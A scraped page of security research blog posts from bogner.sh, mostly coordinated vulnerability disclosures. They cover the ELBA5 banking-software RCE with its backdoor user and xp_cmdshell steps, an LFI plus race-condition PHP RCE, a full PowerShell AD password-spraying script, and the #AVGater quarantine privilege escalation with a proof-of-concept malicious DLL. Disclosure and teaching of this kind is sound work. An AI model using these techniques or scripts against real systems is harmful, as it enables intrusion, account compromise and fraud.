=== Content from packetstormsecurity.com_8e06373f_20250125_154728.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

 [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)



=== Content from bogner.sh_0c1e9306_20250126_100405.html ===

# [#bogner.sh](https://bogner.sh)

## [0-Day in ELBA5’s Network Installation: Overtaking your company’s bank account](https://bogner.sh/2018/11/0-day-in-elba5s-network-installation-overtaking-your-companys-bank-account/ "0-Day in ELBA5’s Network Installation: Overtaking your company’s bank account")

 [Network](https://bogner.sh/category/network/), [Security](https://bogner.sh/category/security/), [Software](https://bogner.sh/category/software/), [Windows](https://bogner.sh/category/windows/)
 [2 Responses »](https://bogner.sh/2018/11/0-day-in-elba5s-network-installation-overtaking-your-companys-bank-account/#comments)

Nov 162018

This blog post is about a previously unknown critical vulnerability in the [Austrian](https://en.wikipedia.org/wiki/Austria) electronic banking application [ELBA5](https://www.elba.at/). The issue discussed here could be abused to gain full control over any ELBA5 database server as well as the underlying operating system. It has a confirmed [CVSSv3 score of 10.0](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H).

**TL;DR: To secure your ELBA5 network installation, please update to the latest available ELBA5 release (5.8.1). For further information please see <https://www.elba.at>**
# What is ELBA5?

ELBA5, as shown below, is one of Austria’s most important business-focused electronic banking applications. It is used by the finance departments of many large organisations and supports about 24 different [banks.](https://www.elba.at/eBusiness/01_template1/1206507788612244132-1206515595789049657-1206515595789049657-NA-38-NA.html)

[![](https://bogner.sh/wp-content/uploads/2018/11/Screenshot-2018-11-06-at-13.13.13.png)](https://bogner.sh/wp-content/uploads/2018/11/Screenshot-2018-11-06-at-13.13.13.png)

It is important to note that there are two distinct ELBA5 releases, namely: ELBA5 single-seat and ELBA5 multi-user (aka network installation). The vulnerability discussed here is only exploitable for the ELBA5 network installation. However, I have also reported several other, although less critical issues for the single-seat release. So it’s highly recommended to updated to the latest version anyway.

To give you a broad understanding of how the ELBA5 software stack works in a multi-user configuration, I create the following diagram. On the left side there is the ELBA5 server: This machine has two distinct functions: On the one hand it serves the ELBA5 binary application to all clients using a standard Windows file share. On the other hand it provides the ELBA5 backend, which is basically a [SAP SQL Anywhere Database](https://www.sap.com/products/sql-anywhere.html).

The enduser systems simply connect to the mentioned file share and launch the ELBA5 client from there. This makes it easy to update the application, as there is only a single package that is used by everyone. All the data that is viewed, modified or created from within the ELBA5 client is directly stored into the backend database. This is everything you need to know in order to understand the following exploit…

[![](https://bogner.sh/wp-content/uploads/2018/10/Wenn-ein-CVSS-Score-von-10.0-ein-leeres-Bankkonto-bedeuten-kann-v0.5.jpg)](https://bogner.sh/wp-content/uploads/2018/10/Wenn-ein-CVSS-Score-von-10.0-ein-leeres-Bankkonto-bedeuten-kann-v0.5.jpg)

# How everything started

The story of this vulnerability began during a penetration test last year. There I was able to gain access to the finance department’s terminal server. Amongst other’s they also used the ELBA5 network installation for their daily business. As I’m curious by nature I immediately launched all the interesting looking applications. Below is an image illustrating the sequence of things that happened right after. Can you spot the (possible) issue?

[![](https://bogner.sh/wp-content/uploads/2018/10/Slide2.jpeg)](https://bogner.sh/wp-content/uploads/2018/10/Slide2.jpeg)

Well, here is the thing that caused my attention: How is it possible to install automatic updates without any previous authentication? Is the ELBA5 application using hardcoded credentials to connect to the backend service?

# Initial Analysis

With this initial discovery I started to dig a little deeper. As ELBA5 is developed in Java I used the [CRF](http://www.benf.org/other/cfr/) decompiler to learn more about the inner workings of the application. Strangely, I could not really find any code that established the connection with the database backend. At that point I got really interested…

As my first try failed, I switched to a more brute force-like method: As I guessed that the ELBA5 client uses hardcoded credentials, they have to be somewhere in memory. A quick search for strings like user, uid, password, pwd however did not reveal anything interesting. Hence I thought, these credentials may get cleaned up immediately after establishing the initial connection. This is where the brute force part comes into play: I downloaded Microsoft’s [procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) and took memory dumps as fast as I could while launching ELBA5. As shown in the screenshot below, this worked out. I was able to capture the credentials of not one, but two valid backend users. Namely, “connector” and “elba”:

[![](https://bogner.sh/wp-content/uploads/2018/10/Screenshot-2018-10-12-at-10.17.40.png)](https://bogner.sh/wp-content/uploads/2018/10/Screenshot-2018-10-12-at-10.17.40.png)

By setting up a second ELBA5 network installation, I verified that the connector user always uses the same static password, whereas the elba user’s password did not work there. This was a problem as only the elba user holds administrative DBA privileges. Based on what I had learned already I came up with the assumption that there has to be a two step process for authentication:

#

# The 1 Million Dollar Question: How is this working in Detail?

After taking a closer look at the privileges of the “connector” user on my debug machine (where I knew the DBA password), I discovered that this account is only authorised for a single column in a single table. Well, now I knew where the encrypted DBA password was stored. That it is encrypted (or at least obfuscated) was clear after I compared the content of the daten column with my known elba password. They were completely different.

[![](https://bogner.sh/wp-content/uploads/2018/10/Screenshot-2018-10-12-at-10.31.42.png)](https://bogner.sh/wp-content/uploads/2018/10/Screenshot-2018-10-12-at-10.31.42.png)

So, I again had to take a closer look at the source code of the application. Finally, after many hours of debugging I discovered an interesting comment:

[![](https://bogner.sh/wp-content/uploads/2018/10/Screenshot-2018-10-12-at-10.34.55.png)](https://bogner.sh/wp-content/uploads/2018/10/Screenshot-2018-10-12-at-10.34.55.png)

Has the database logic been “outsourced” into a separate library? To get a first glance I extracted all the strings from the systemtools.dll library… Some stood out immediately:

[![](https://bogner.sh/wp-content/uploads/2018/10/Screenshot-2018-10-12-at-10.39.11.png)](https://bogner.sh/wp-content/uploads/2018/10/Screenshot-2018-10-12-at-10.39.11.png)The highlighted SQL commands in the above screenshot are likely used to decrypt the secret elba DBA database password. Presumedly the AES encryption algorithm was used to secure the password. From the static strings alone however, I was not able to exfiltrate the required password. So I had to switch to something more dynamic: [Immunity Debugger](https://www.immunityinc.com/products/debugger/).

After setting an access breakpoint on the memory addresses of the above strings (and a few hours of debugging), I found the following information on the stack. The highlighted part contains the hardcoded key that is used to decrypt the elba user’s password.

[![](https://bogner.sh/wp-content/uploads/2018/10/Untitled.png)](https://bogner.sh/wp-content/uploads/2018/10/Untitled.png)

# Bringing it all together

By combining what I had learned by now, it was possible to reliably gain DBA permissions for every single ELBA5 network installation:

1. Connect to the database with the hardcoded “connector” user and SELECT the AES encrypted DBA’s user password
2. Decrypt the password with the static AES key, as obtained with the help of Immunity Debugger
3. Connect to the database with the user elba and the decrypted password. We now have full control over all information that is stored in the DB.

However, this was where the real fun began…

# Adding a Backdoor User

As I was targeting a banking application I thought it would be great to earn a bit of extra cash. So, what about adding a backdoor user?

After again analysing the source code I found out how the user’s password is stored in the table “BEDIENER”:

[![](https://bogner.sh/wp-content/uploads/2018/10/Screenshot-2018-10-12-at-13.00.34.png)](https://bogner.sh/wp-content/uploads/2018/10/Screenshot-2018-10-12-at-13.00.34.png)

By analysing all the involved methods, I was able to make it more readable as:

[![](https://bogner.sh/wp-content/uploads/2018/11/Screenshot-2018-10-12-at-11.10.551.png)](https://bogner.sh/wp-content/uploads/2018/11/Screenshot-2018-10-12-at-11.10.551.png)

This finally made it possible to remotely add arbitrary users to the ELBA5 installation. Logically with admin permissions:

[![](https://bogner.sh/wp-content/uploads/2018/11/Screenshot-2018-11-06-at-13.25.13.png)](https://bogner.sh/wp-content/uploads/2018/11/Screenshot-2018-11-06-at-13.25.13.png)

*Because everyone wants to have a user called “HACKER” in this electronic backing application – Right?*

# Remote Code Execution

But wait, there is more. Because from a pentester’s point of view we care more about overtaking a server than stealing money…. Luckily there is an old friend in the ELBA5 SQL Anywhere database server that we can use: [xp\_cmdshell](http://dcx.sybase.com/1200/en/dbreference/xp-cmdshell-sysproc.html). This SQL command can be used to run arbitrary applications on the operating system level. What makes this even more interesting was, that the database runs with full SYSTEM level permissions:

[![](https://bogner.sh/wp-content/uploads/2018/10/Screenshot-2018-10-12-at-11.20.19.png)](https://bogner.sh/wp-content/uploads/2018/10/Screenshot-2018-10-12-at-11.20.19.png)

That means, we can also add a new Windows Admin. This give us full control over the affected server. [Mimikatz](https://github.com/gentilkiwi/mimikatz) anyone?

# PoC Exploit

To automate the process discussed in this blog post, I wrote a fully fledge python exploit. It can either be used to add a new ELBA5 user to the database or remotely run a command with SYSTEM permissions on the target system. The only thing that is required is that the ELBA5 SQL Anywhere Database service is running a vulnerable version and is accessible over the network (TCP port 2640).

[![](https://bogner.sh/wp-content/uploads/2018/10/Screenshot-2018-10-12-at-12.16.46.png)](https://bogner.sh/wp-content/uploads/2018/10/Screenshot-2018-10-12-at-12.16.46.png)

You can download the full exploit here:

[![](https://bogner.sh/wp-content/uploads/2018/11/Screenshot-2018-11-06-at-13.34.06.png)](https://bogner.sh/wp-content/uploads/2018/11/elba5_exploit.py_.zip)

# Coordinate Public Disclosure Process

I also want to briefly discuss the coordinated public disclosure process that I went through with the developers of ELBA5. The initial issue was reported last year and triaged within days. As some may have already guessed, this is more an architectural issue and so it required intense rewrites and testing. I was invited twice during this process to discuss the current state. We openly talked about the risks and how they can be mitigated.

I really want to everyone involved for how professionally this matter was resolved. Not many companies take IT security that serious. It really shows how they values their partners and endusers. **THANK YOU!**

# Mitigation

This coordinated process is also important for endusers. Why? Well, because the only thing they have to do is: Please install the lastest ELBA5 5.8.1 release from <https://www.elba.at>. A lot of testing went into making the transition to the new authentication module completely transparent.

# Summary

As I always think it is important to summaries the key aspect, I created the following overview. It gives a great high level introduction into the underlying vulnerability and the suggested solution. This slide is also available in [German](https://bogner.sh/wp-content/uploads/2018/11/ELBA5_RCE_de.png).

[![](https://bogner.sh/wp-content/uploads/2018/11/ELBA5_RCE_en.png)](https://bogner.sh/wp-content/uploads/2018/11/ELBA5_RCE_en.png)

If you have any questions, please contact me directly at florian@bee-itsecurity.at or use the comment form below.

Thanks for reading that far 😉

 Posted by [florian](https://bogner.sh/author/florian/) at 07:01

## [Exploit Development for Dummies [Video]](https://bogner.sh/2018/09/exploit-development-for-dummies-video/ "Exploit Development for Dummies [Video]")

 [Security](https://bogner.sh/category/security/), [Software](https://bogner.sh/category/software/), [Windows](https://bogner.sh/category/windows/)
 [1 Response »](https://bogner.sh/2018/09/exploit-development-for-dummies-video/#comments)

Sep 242018

Have you ever asked yourself how vulnerabilities are discovered and how exploits are written? Well, then this is the perfect video for you. We will start by discussing how so called Fuzzers can be used to find previously unknown bugs in applications. Then we will analyse the generated crash dumps to find out if the underlying issue is exploitable and finally, we will write a fully-fledged exploit.

All this will be demonstrated “live”, based on the example of a well-known application with more than 1 million downloads per month. This is your chance to be part of the disclosure of a previously unknown zero-day vulnerability!

If you have any questions or feedback leave a comment below!

 Posted by [florian](https://bogner.sh/author/florian/) at 06:17

## [There is something in the air: Launching Bee IT Security](https://bogner.sh/2018/07/there-is-something-in-the-air-launching-bee-it-security/ "There is something in the air: Launching Bee IT Security")

 [Software](https://bogner.sh/category/software/), [Windows](https://bogner.sh/category/windows/)
 [No Responses »](https://bogner.sh/2018/07/there-is-something-in-the-air-launching-bee-it-security/#respond)

Jul 182018

Over the last years I painfully realised that IT Security is a very complex topic. Often it is difficult to communicate the scope of certain vulnerabilities and their mitigation strategies to layman’s and sometimes even IT professionals. I guess that’s the reason why many security consultancies don’t even try. But this is not my way!

Hence, I finally started my own business: **Bee IT Security Consulting e.U.**

[![](https://bogner.sh/wp-content/uploads/2018/07/logo.png)](https://bogner.sh/wp-content/uploads/2018/07/logo.png)

Our goal is to aid organisations in understanding their current security level and to help them take the best next steps for their business. To do that I’m provide security consulting services, including Penetration Testing, Workshops, Awareness and additionally I still love to give talks!

If you want to know more you can visit my new webpage <https://www.bee-itsecurity.at> (german only) or contact me at florian@bee-itsecurity.at.

 Posted by [florian](https://bogner.sh/author/florian/) at 06:32

## [Race to RCE: There is more on the Web than just XSS](https://bogner.sh/2018/04/race-to-rce-there-is-more-on-the-web-than-just-xss/ "Race to RCE: There is more on the Web than just XSS")

 [Security](https://bogner.sh/category/security/), [Software](https://bogner.sh/category/software/)
 [No Responses »](https://bogner.sh/2018/04/race-to-rce-there-is-more-on-the-web-than-just-xss/#respond)

Apr 032018

As you might have guessed already by the title: I’m not a big fan of web vulnerabilities. Well, actually it is not the fault of the web here, but that I have the feeling the many people are just reporting XSS as if it were [super critical](https://www.openbugbounty.org/). I do fully understand that its consequences can be devastating, but most often they are not. PERIOD.

In this post I want to document an exploit that I discovered during one of my latest pentests. I consider it a great example, that shows that the web can in fact be interesting. By combining several issues it’s often / sometimes / once-in-a-lifetime possible to achieve something really interesting, like a remote code execution. As I can’t discuss the vulnerabilities on the real product (because of legal obligations), I rebuilt the interesting parts myself and pushed them to my [race2rce Github](https://github.com/fbogner/race2rce) repro. So you can try it out yourself it you are curious.

Everything started with the following [dirb](https://www.darknet.org.uk/2016/03/dirb-domain-brute-forcing-tool/) scan:[![](https://bogner.sh/wp-content/uploads/2018/03/Screen-Shot-2018-03-27-at-22.05.54.png)](https://bogner.sh/wp-content/uploads/2018/03/Screen-Shot-2018-03-27-at-22.05.54.png)

As you can see there is a “hidden” directory /Global with directory listing enabled on the target server. Many of the therein identified directories were empty or could only be accessed with valid credentials. However, the folders *lic* and *logviewer* were unsecured. Additionally, the file demo.lic could be downloaded.

[![](https://bogner.sh/wp-content/uploads/2018/03/Screen-Shot-2018-03-27-at-22.27.50.png)](https://bogner.sh/wp-content/uploads/2018/03/Screen-Shot-2018-03-27-at-22.27.50.png)

Let’s start with the folder /Global/logviewer. It’s a simple web page to monitor some kind of log. After selecting one of the listed files, its content is shown. The interesting part is the URL: http://192.168.88.147/Global/logviewer/?file=../logs/fakeapp.1.log. The highlighted parted almost screams for a [LFI](https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion).[![](https://bogner.sh/wp-content/uploads/2018/03/Screen-Shot-2018-03-27-at-22.31.40.png)](https://bogner.sh/wp-content/uploads/2018/03/Screen-Shot-2018-03-27-at-22.31.40.png)

And I was right. By modifying the URL to http://192.168.88.147/Global/logviewer/?file=../../../../../../../../etc/passwd a list of all users was printed. [![](https://bogner.sh/wp-content/uploads/2018/03/Screen-Shot-2018-03-27-at-22.38.15.png)](https://bogner.sh/wp-content/uploads/2018/03/Screen-Shot-2018-03-27-at-22.38.15.png)

The big question: Is there anything that is worth reading? Well, let’s check the content of /Global/lic.[![](https://bogner.sh/wp-content/uploads/2018/03/Screen-Shot-2018-03-27-at-22.42.47.png)](https://bogner.sh/wp-content/uploads/2018/03/Screen-Shot-2018-03-27-at-22.42.47.png)

It looks like a license viewer where .lic files can be uploaded and checked for validity. By uploading the demo.lic (as previously downloaded) we learn that the license file is not valid (anymore).

[![](https://bogner.sh/wp-content/uploads/2018/03/Screen-Shot-2018-03-27-at-22.48.50.png)](https://bogner.sh/wp-content/uploads/2018/03/Screen-Shot-2018-03-27-at-22.48.50.png)

The question is, what is this file doing in the background? By abusing the LFI vulnerability we can obtain the underlying source: http://192.168.88.147/Global/logviewer/?file=../lic/index.php

[![](https://bogner.sh/wp-content/uploads/2018/03/Screen-Shot-2018-03-27-at-22.52.23.png)](https://bogner.sh/wp-content/uploads/2018/03/Screen-Shot-2018-03-27-at-22.52.23.png)

This looks interesting, so let’s analyse the file in detail. In our example here, we can simply use the original file [from Github](https://github.com/fbogner/race2rce/blob/master/htdocs/Global/lic/index.php).

The first thing we learn is that there is a magic byte sequence. The file is only processed any further if it starts with “fakeapp”.

[![](https://bogner.sh/wp-content/uploads/2018/03/Screen-Shot-1-2018-03-27-at-22.59.29.png)](https://bogner.sh/wp-content/uploads/2018/03/Screen-Shot-1-2018-03-27-at-22.59.29.png)

After that, the rest of the file is stored with the user provided file name. Because there is no additional path given, the file is saved in the current working directory.

[![](https://bogner.sh/wp-content/uploads/2018/03/Screen-Shot-2018-03-27-at-23.03.11.png)](https://bogner.sh/wp-content/uploads/2018/03/Screen-Shot-2018-03-27-at-23.03.11.png)

Furthermore, after the license file has been checked it is removed from the server:

[![](https://bogner.sh/wp-content/uploads/2018/03/Screen-Shot-1-2018-03-27-at-23.05.22.png)](https://bogner.sh/wp-content/uploads/2018/03/Screen-Shot-1-2018-03-27-at-23.05.22.png)

Well… this may be vulnerable for a race condition. If we add the magic bytes to any PHP code file, it should be stored in the current working directory with the filename we provide during the upload. If the file is requested at exactly the right time – between it was written to disc and before it is removed – arbitrary PHP commands can be executed. At least that’s the theory.

With that knowledge I started to build a small Python [exploit PoC](https://github.com/fbogner/race2rce/blob/master/elv_rce_exploit.py). It uses two threads to abuse the identified race condition. One thread (called writer) tries to upload a malicious PHP license file that can execute arbitrary CLI commands.

[![](https://bogner.sh/wp-content/uploads/2018/03/Screen-Shot-2018-03-27-at-23.19.01-copy.png)](https://bogner.sh/wp-content/uploads/2018/03/Screen-Shot-2018-03-27-at-23.19.01-copy.png)

The second thread (the main thread) tries to find the right moment to exploit it. The following screenshots shows it in action.[![](https://bogner.sh/wp-content/uploads/2018/03/Untitled.gif)](https://bogner.sh/wp-content/uploads/2018/03/Untitled.gif)

In this blog post I wanted to show that there is more than XSS. Sometimes you have to be creative to find something interesting – like a remote code execution. But please always remember: A vulnerability is only as critical as the data that is exposed on or from the affected system as well as the gained access level.

[![](https://bogner.sh/wp-content/uploads/2018/03/41-GitHub.png)](https://bogner.sh/wp-content/uploads/2018/03/41-GitHub.png)

If you are keen to try it yourself, you can download everything from my [race2rce Github repro](https://github.com/fbogner/race2rce).

 Posted by [florian](https://bogner.sh/author/florian/) at 18:52

## [Checking AD Users for a Standard Password with PowerShell](https://bogner.sh/2018/03/checking-ad-users-for-a-standard-password/ "Checking AD Users for a Standard Password with PowerShell")

 [Security](https://bogner.sh/category/security/), [Software](https://bogner.sh/category/software/)
 [1 Response »](https://bogner.sh/2018/03/checking-ad-users-for-a-standard-password/#comments)

Mar 092018

During one of my latest pentest assignments I learned about a standard password widely used within the target organisation. Hence, I wanted to check all functional AD user accounts for said password. Normally I would solve this task by using Metasploit’s [smb\_login](https://www.offensive-security.com/metasploit-unleashed/scanner-smb-auxiliary-modules/) auxiliary module. However, in this case I had no access to my toolkit.

To still solve the task, I came back to good old Powershell. With just a few lines of code I wrote my own login checker. It simply reads a file (user.txt) line by line and tries to authenticate as this user with the given standard password against the domain. Be aware that this is everything but silent! However, sometimes you simply don’t care about flying below the radar and sometimes you just know no-one is watching anyway 😉

Without further due, here’s the code. Maybe it’s of use for someone else.

```

foreach($line in Get-Content .\user.txt) {
    $username = $line
    $password = "FakeNews"

    # Get current domain using logged-on user's credentials
    $CurrentDomain = "LDAP://" + ([ADSI]"").distinguishedName

	# Try to connect using the credentials to test
    $domain = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain,$UserName,$Password)

    if ($domain.name -eq $null)
    {
     write-host  -ForegroundColor Red "[-] User $username"
    }
    else
    {
     write-host -ForegroundColor Green "[+] User $username uses $password"
    }
}

```

The following screenshot illustrates the expected output.

[![](https://bogner.sh/wp-content/uploads/2018/03/Screen-Shot-2018-03-09-at-18.51.08.png)](https://bogner.sh/wp-content/uploads/2018/03/Screen-Shot-2018-03-09-at-18.51.08.png)And don’t forget: Always watch for Fake News in your org

 Posted by [florian](https://bogner.sh/author/florian/) at 20:00

## [#AVGater: Getting Local Admin by Abusing the Anti-Virus Quarantine](https://bogner.sh/2017/11/avgater-getting-local-admin-by-abusing-the-anti-virus-quarantine/ "#AVGater: Getting Local Admin by Abusing the Anti-Virus Quarantine")

 [Security](https://bogner.sh/category/security/), [Software](https://bogner.sh/category/software/)
 [2 Responses »](https://bogner.sh/2017/11/avgater-getting-local-admin-by-abusing-the-anti-virus-quarantine/#comments)

Nov 102017

As you may have noticed, it has been quite still here for a while. This was related to the preparations for this release: A post disclosing a new type of vulnerability, affecting multiple Anti-Virus solutions. To summaries: **Today, I’m disclosing an issue, that can be exploited by any local user to gain full control over the endpoint by abusing the restore from quarantine Anti-Virus feature.**

And because every new vulnerability needs its own name and logo, I want to introduce you to #AVGater:

[![](https://bogner.sh/wp-content/uploads/2017/10/logo_small-copy.png)](https://bogner.sh/wp-content/uploads/2017/10/logo_small-copy.png)

# The Basics

But let’s get back on track, by discussing a few Anti-Virus basics. The following diagram shows the inner workings of a typical AV from an unprivileged user’s point of view. There are three different access domains: The kernel mode, the privileged user mode (SYSTEM) and the unprivileged user mode. As shown in the following image, the different components have widely different duties:

[![](https://bogner.sh/wp-content/uploads/2017/10/Screen-Shot-2017-10-25-at-10.33.47.png)](https://bogner.sh/wp-content/uploads/2017/10/Screen-Shot-2017-10-25-at-10.33.47.png)

Within the context of the unprivileged user there is only the AV user interface. By itself, it has no real power, because its executing within a limited user session. However, by talking to the AV Windows service it can do many things a normal user would not be able too. For example it may be allowed to restore files from the virus quarantine (*This could be a hint – Couldn’t it?*). Additionally there is kernel component. Most likely it’s doing the real work of checking objects for known threat identifiers.

# The Idea

So what’s the real point here? Well, if a non-privileged user would be able to manipulate any of the communication channels that cross security boundaries (unprivileged user mode to privileged user mode or privileged user mode to kernel mode) he could escalate his privileges. But how to do that?

In the case of #AVGater, the answer to this question is: **By manipulating the restore process from the virus quarantine**:

As shown in the above video, #AVGater can be used to restore a previously quarantined file to any arbitrary filesystem location. This is possible because the restore process is most often carried out by the privileged AV Windows user mode service. Hence, file system ACLs can be circumvented (as they don’t really count for the SYSTEM user). This type of issue is called a privileged file write vulnerability and can be used to place a malicious DLL anywhere on the system. The goal is to side load this library for a legitimate Windows servers by abusing the [DLL Search Order](https://msdn.microsoft.com/en-us/library/windows/desktop/ms682586%28v%3Dvs.85%29.aspx?f=255&MSPPError=-2147217396):

[![](https://bogner.sh/wp-content/uploads/2017/11/Screen-Shot-2017-11-08-at-20.54.53.png)](https://bogner.sh/wp-content/uploads/2017/11/Screen-Shot-2017-11-08-at-20.54.53.png)

If this succeeds, arbitrary code can be executed with the help of the [DLLMain entry point](https://msdn.microsoft.com/en-us/library/windows/desktop/ms682583%28v%3Dvs.85%29.aspx?f=255&MSPPError=-2147217396).

But there is still one very important question still unanswered: How is it possible to tamper with the restore process? The solution are [NTFS directory junctions](https://msdn.microsoft.com/en-us/library/windows/desktop/aa365006%28v%3Dvs.85%29.aspx). They are basically symbolic links for directories that can be created by anyone with the help of [mklink](https://technet.microsoft.com/en-us/library/cc753194%28v%3Dws.11%29.aspx?f=255&MSPPError=-2147217396).

[![](https://bogner.sh/wp-content/uploads/2017/10/Picture1.png)](https://bogner.sh/wp-content/uploads/2017/10/Picture1.png)

**#AVGater in plain english:** By abusing NTFS directory junctions, the AV quarantine restore process can be manipulated, so that previously quarantined files can be written to arbitrary file system locations.

# Putting it all together

With all this knowledge, we can now paint a complete attack scenario: First a malicious library is moved to the AV quarantine. Then, by abusing directory junctions the original source path is redirected to another destination. Most likely a folder within C:\Program Files or C:\Windows. By restoring the previously quarantined file, the SYSTEM permissions of the AV Windows user mode service are misused, and the malicious library is placed in a folder where the currently signed in user is unable to write to under normal conditions. Because of how the [DLL search order](https://msdn.microsoft.com/en-us/library/windows/desktop/ms682586%28v%3Dvs.85%29.aspx?f=255&MSPPError=-2147217396) works, it is finally loaded by another privileged Windows process. Thereby the code within the DLLMain of the malicious library is executed. Hence, a local non-admin attacker gained full control over the affected endpoint.

Here’s a diagram illustrating the whole process:[![](https://bogner.sh/wp-content/uploads/2017/11/Screen-Shot-2017-11-05-at-15.41.49.png)](https://bogner.sh/wp-content/uploads/2017/11/Screen-Shot-2017-11-05-at-15.41.49.png)

# Who is/was affected?

During the preparation for this public disclosure, several different product have been checked for #AVGater.

The following vendors have already released their fix. However, there are a few more to come!

|  |  |  |
| --- | --- | --- |
|  |  |  |
|  |  |  |

If anyone finds additional vulnerable products, please contact me. I will report them and update this list as soon as they fixed the issue.

# Getting our hands dirty

If you want to know more about how to exploit #AVGator in a real life scenario, I have a good news for you: I already fully documented two exploit vectors:

* [Local Privilege Escalation in Emsisoft Anti-Malware by abusing NTFS Directory Junctions #AVGater](https://bogner.sh/2017/11/local-privilege-escalation-in-emsisoft-anti-malware-by-abusing-ntfs-directory-junctions-avgater/)
* [Local Privilege Escalation in Malwarebytes 3 by abusing NTFS Directory Junctions #AVGater](https://bogner.sh/2017/11/local-privilege-escalation-in-malwarebytes-3-by-abusing-ntfs-directory-junctions-avgater/)

Additionally, here are the slides of my talk “When your anti virus turns against you” from the [IT SECX conference](https://itsecx.fhstp.ac.at/).

# How to protect myself?

Generally, it’s pretty simple: Always install updates in a timely manner. However, as some vendors still need a few more days to release their fix, it may take a little till everyone is protected.

Furthermore, as #AVGator can only be exploited if the user is allowed to restore previously quarantined file, I recommend everyone within a corporate environment to block normal users from restoring identified threats. This is wise in any way.

 Posted by [florian](https://bogner.sh/author/florian/) at 08:34

## [Local Privilege Escalation in Malwarebytes 3 by abusing NTFS Directory Junctions #AVGater](https://bogner.sh/2017/11/local-privilege-escalation-in-malwarebytes-3-by-abusing-ntfs-directory-junctions-avgater/ "Local Privilege Escalation in Malwarebytes 3 by abusing NTFS Directory Junctions #AVGater")

 [Security](https://bogner.sh/category/security/), [Software](https://bogner.sh/category/software/), [Windows](https://bogner.sh/category/windows/)
 [No Responses »](https://bogner.sh/2017/11/local-privilege-escalation-in-malwarebytes-3-by-abusing-ntfs-directory-junctions-avgater/#respond)

Nov 102017

This post is about a local privilege escalation vulnerability in Malwarebytes Anti-Malware 3. It can be abused by any local user to gain full control over the system. It is based on [#AVGater](https://bogner.sh/AVGater), a class of Anti-Virus vulnerabilities related to the handling of quarantined files. It has been verified on a fully patched english Windows 7 x64 running Malwarebytes Free 3.0.5.1299.

[![](https://bogner.sh/wp-content/uploads/2017/01/Screen-Shot-2017-01-14-at-20.59.44.png)](https://bogner.sh/wp-content/uploads/2017/01/Screen-Shot-2017-01-14-at-20.59.44.png)

The underlying issue is that the Quarantine feature can be abuse to write arbitrary files to any filesystem location with full SYSTEM level permissions.

The first step in this attack is that a file with the name version.dll has to be quarantined from an otherwise empty folder. A good trick to do so is to simply rename a well-known malware to version.dll. I prepared such a sample [here](https://bogner.sh/wp-content/uploads/2017/01/version.dll_.zip). Download it to ~\Desktop\X\version.dll and trigger a manual scan to get it detected.

As soon as the following dialog is shown, replace the already detected malware with our [payload](https://bogner.sh/wp-content/uploads/2017/01/version.dll_-1.zip).

[![](https://bogner.sh/wp-content/uploads/2017/01/Screen-Shot-2017-01-14-at-21.02.57.png)](https://bogner.sh/wp-content/uploads/2017/01/Screen-Shot-2017-01-14-at-21.02.57.png)

The prepared payload mimics the Windows library version.dll. However, instead of providing any real functionality it simply logs the current user to C:\Users\Public\user.txt. You can download the [full source](https://bogner.sh/wp-content/uploads/2017/01/4-bad_dll.cpp_.zip) here.

```

int DllMain(void* hinst, unsigned long* reason, void* reserved) {
	system("cmd /c \"whoami >> C:\\Users\\Public\\user.txt\"");
	exit(1);
	return 0;
}

```

Then finish the quarantine process and reboot the system. Now delete the previously created and now empty folder X and replace it with a directory junction as shown below.

[![](https://bogner.sh/wp-content/uploads/2017/01/Screen-Shot-2017-01-14-at-21.04.44.png)](https://bogner.sh/wp-content/uploads/2017/01/Screen-Shot-2017-01-14-at-21.04.44.png)

Finally restore the quarantined file.

[![](https://bogner.sh/wp-content/uploads/2017/01/Screen-Shot-2017-01-14-at-22.03.20.png)](https://bogner.sh/wp-content/uploads/2017/01/Screen-Shot-2017-01-14-at-22.03.20.png)

Because of the directory junction the library version.dll is restored to C:\Program Files\Malwarebytes\Anti-Malware.

[![](https://bogner.sh/wp-content/uploads/2017/01/Screen-Shot-2017-01-14-at-21.05.34.png)](https://bogner.sh/wp-content/uploads/2017/01/Screen-Shot-2017-01-14-at-21.05.34.png)

After a reboot our “malicious” version.dll is loaded by the Windows service “Malwarebytes Service” (mbamservice.exe). As this service uses the SYSTEM account, we gained full control over the computer. This is also documented as the current user is logged to C:\Users\Public\user.txt.

[![](https://bogner.sh/wp-content/uploads/2017/01/Screen-Shot-2017-01-14-at-21.17.17.png)](https://bogner.sh/wp-content/uploads/2017/01/Screen-Shot-2017-01-14-at-21.17.17.png)

# Suggested solution

It should be impossible to restore files to filesystem locations containing a directory junction.

# Timeline

* 14.1.2017: The issues has been documented and reported
* 19.1.2017: Vendor starts investigation
* 26.1.2017: Issue confirmed – Fix implemented
* 27.3.2017: Update fully deployed
* 11.10.2017: Public release

 Posted by [florian](https://bogner.sh/author/florian/) at 08:30

## [CVE-2017-4918: Code Injection in VMware Horizon’s macOS Client](https://bogner.sh/2017/07/cve-2017-4918-code-injection-in-vmware-horizons-macos-client/ "CVE-2017-4918: Code Injection in VMware Horizon’s macOS Client")

 [Mac OS X](https://bogner.sh/category/mac-os-x/), [Security](https://bogner.sh/category/security/), [Software](https://bogner.sh/category/software/)
 [No Responses »](https://bogner.sh/2017/07/cve-2017-4918-code-injection-in-vmware-horizons-macos-client/#respond)

Jul 102017

In this blog post I want to discuss a code injection vulnerability in [VMware Horizon](http://www.vmware.com/products/horizon.html)‘s macOS Client Version 4.4.0 (5164329) that can be abused to gain local root privileges. The good news is, that it has already been fixed in the [latest available version](https://www.vmware.com/us/security/advisories/VMSA-2017-0011.html). I found it after learning about the “Open VMware View Client Services” [SUID binary](https://en.wikipedia.org/wiki/Setuid) on **my**Mac.

[![](https://bogner.sh/wp-content/uploads/2017/04/Screen-Shot-2017-04-21-at-21.28.31.png)](https://bogner.sh/wp-content/uploads/2017/04/Screen-Shot-2017-04-21-at-21.28.31.png)

I think it is used internally by Horizon’s remote USB services and is only exploitable after they have been started once by entering administrative credentials.

